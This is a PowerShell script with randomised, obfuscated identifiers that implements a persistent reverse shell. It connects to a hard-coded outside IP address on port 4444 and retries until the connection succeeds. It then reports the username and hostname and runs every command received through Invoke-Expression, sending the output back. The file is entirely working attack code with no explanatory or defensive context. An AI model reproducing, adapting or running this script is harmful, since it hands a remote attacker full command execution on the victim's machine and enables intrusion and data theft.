class tlfxBMNSQFJJ {
    
    [string]$EcwzRHjWHBlI = "93.49.240.195"
    [int]$jAkuB = 4444

    $cprRWmSSyvmgdTaEfJWaOIDG
    $OGLIUlJQbokWldXH
    $fYgcuVMHU
    $bWTErRqOQoZftJRTGtOdeJW
    $hyOISJUJAiEPTjwIX
    $PLgWjhkgeeqDeAyEFjtoNWgz
    [int]$MbvsN = 50*1024

    qPDPUkfcA() {
        $this.OGLIUlJQbokWldXH = $false
        while ($true) {
            try {
                $this.OGLIUlJQbokWldXH = New-Object Net.Sockets.TcpClient($this.EcwzRHjWHBlI, $this.jAkuB)
                break
            } catch [System.Net.Sockets.SocketException] {
                Start-Sleep -Seconds 5
            }
        }
        $this.LHtujVFbOiSRAls()
    }

    LHtujVFbOiSRAls() {
        $this.cprRWmSSyvmgdTaEfJWaOIDG = $this.OGLIUlJQbokWldXH.GetStream()
        $this.bWTErRqOQoZftJRTGtOdeJW = New-Object Byte[] $this.MbvsN
        $this.PLgWjhkgeeqDeAyEFjtoNWgz = New-Object Text.UTF8Encoding
        $this.fYgcuVMHU = New-Object IO.StreamWriter($this.cprRWmSSyvmgdTaEfJWaOIDG, [Text.Encoding]::UTF8, $this.MbvsN)
        $this.hyOISJUJAiEPTjwIX = New-Object System.IO.StreamReader($this.cprRWmSSyvmgdTaEfJWaOIDG)
        $this.fYgcuVMHU.AutoFlush = $true
    }

    qfaTIYpLjXQtM() {
        $this.qPDPUkfcA()
        $this.JafbrQEPXQUEb()
    }

    DuWkunI($iMfvUaQNvIowiAlZ) {
        try {
            [byte[]]$tXlqFJiPHgLTsqIXpbSio = [text.Encoding]::Ascii.GetBytes($iMfvUaQNvIowiAlZ)
            $this.fYgcuVMHU.Write($tXlqFJiPHgLTsqIXpbSio, 0, $tXlqFJiPHgLTsqIXpbSio.length)   
        } catch [System.Management.Automation.MethodInvocationException] {
            $this.qfaTIYpLjXQtM()
        }
    }

    [string] GomxekoxDqITrLV() {
        try {
            $EpFPtCI = $this.cprRWmSSyvmgdTaEfJWaOIDG.Read($this.bWTErRqOQoZftJRTGtOdeJW, 0, $this.MbvsN)    
            $pFastsjmWsjiJ = ($this.PLgWjhkgeeqDeAyEFjtoNWgz.GetString($this.bWTErRqOQoZftJRTGtOdeJW, 0, $EpFPtCI))
            return $pFastsjmWsjiJ
        } catch [System.Management.Automation.MethodInvocationException] {
            $this.qfaTIYpLjXQtM()
            return ""
        }
    }

    [string] CnTvGZ($vFLGxEvRludKQ) {
        Write-Host $vFLGxEvRludKQ
        try { 
            $bpMOHGvhLrpic = Invoke-Expression $vFLGxEvRludKQ | Out-String
        }
        catch {
            $VlZaRJIU = $_.Exception
            $zkYgGinoPmlkhj = $_.Message
            $bpMOHGvhLrpic = "`n$_`n"
        }
        return $bpMOHGvhLrpic
    }

    [string] qRXpbuWawY() {
        $fMvMnVUMQjFgmFmNAPOc = [Environment]::UserName
        $zgYBphnchLUoKM = [System.Net.Dns]::GetHostName()
        $cHTQaJyIQ = Get-Location
        return "$fMvMnVUMQjFgmFmNAPOc@$zgYBphnchLUoKM [$cHTQaJyIQ]~$ "
    }

    JafbrQEPXQUEb() {
        while ($this.OGLIUlJQbokWldXH.Connected) {
            $this.DuWkunI($this.qRXpbuWawY())         
            $pFastsjmWsjiJ = $this.GomxekoxDqITrLV()
            $bpMOHGvhLrpic = "`n"
            if ([string]::IsNullOrEmpty($pFastsjmWsjiJ)) {
                continue
            }
            $bpMOHGvhLrpic = $this.CnTvGZ($pFastsjmWsjiJ)
            $this.DuWkunI($bpMOHGvhLrpic + "`n")
            $this.cprRWmSSyvmgdTaEfJWaOIDG.Flush()
        }
        $this.OGLIUlJQbokWldXH.Close()
        $this.qfaTIYpLjXQtM()
    } 
}

$SsAIyrHKrpaVJzjSOgWaENY = [tlfxBMNSQFJJ]::new()
$SsAIyrHKrpaVJzjSOgWaENY.qfaTIYpLjXQtM()
